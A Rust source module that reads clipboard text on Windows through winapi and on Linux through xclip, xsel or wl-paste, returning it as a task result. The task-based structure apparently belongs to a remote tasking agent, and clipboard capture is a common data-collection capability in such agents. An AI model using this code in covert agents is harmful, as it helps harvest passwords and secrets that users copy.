/// Clipboard: read clipboard text content.

use super::TaskResult;

pub fn read(task_id: i64, _args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        read_windows(task_id)
    }
    #[cfg(not(target_os = "windows"))]
    {
        read_linux(task_id)
    }
}

#[cfg(target_os = "windows")]
fn read_windows(task_id: i64) -> TaskResult {
    unsafe {
        use winapi::um::winuser::*;
        use winapi::um::winbase::GlobalLock;
        use winapi::um::winbase::GlobalUnlock;
        use std::ptr;

        if OpenClipboard(ptr::null_mut()) == 0 {
            return TaskResult::error(task_id, "OpenClipboard failed".to_string());
        }

        let handle = GetClipboardData(CF_UNICODETEXT);
        if handle.is_null() {
            CloseClipboard();
            return TaskResult::success(task_id, String::new());
        }

        let data = GlobalLock(handle);
        if data.is_null() {
            CloseClipboard();
            return TaskResult::error(task_id, "GlobalLock failed".to_string());
        }

        // Read null-terminated UTF-16 string
        let wide_ptr = data as *const u16;
        let mut len = 0;
        while *wide_ptr.add(len) != 0 {
            len += 1;
            if len > 1_000_000 {
                break; // Safety limit
            }
        }

        let slice = std::slice::from_raw_parts(wide_ptr, len);
        let text = String::from_utf16_lossy(slice);

        GlobalUnlock(handle);
        CloseClipboard();

        TaskResult::success(task_id, text)
    }
}

#[cfg(not(target_os = "windows"))]
fn read_linux(task_id: i64) -> TaskResult {
    // Try xclip first, then xsel
    let output = std::process::Command::new("xclip")
        .args(["-selection", "clipboard", "-o"])
        .output()
        .or_else(|_| {
            std::process::Command::new("xsel")
                .args(["--clipboard", "--output"])
                .output()
        })
        .or_else(|_| {
            // Wayland: wl-paste
            std::process::Command::new("wl-paste").output()
        });

    match output {
        Ok(out) if out.status.success() => {
            TaskResult::success(task_id, String::from_utf8_lossy(&out.stdout).to_string())
        }
        _ => TaskResult::error(
            task_id,
            "clipboard read failed (no xclip/xsel/wl-paste available)".to_string(),
        ),
    }
}
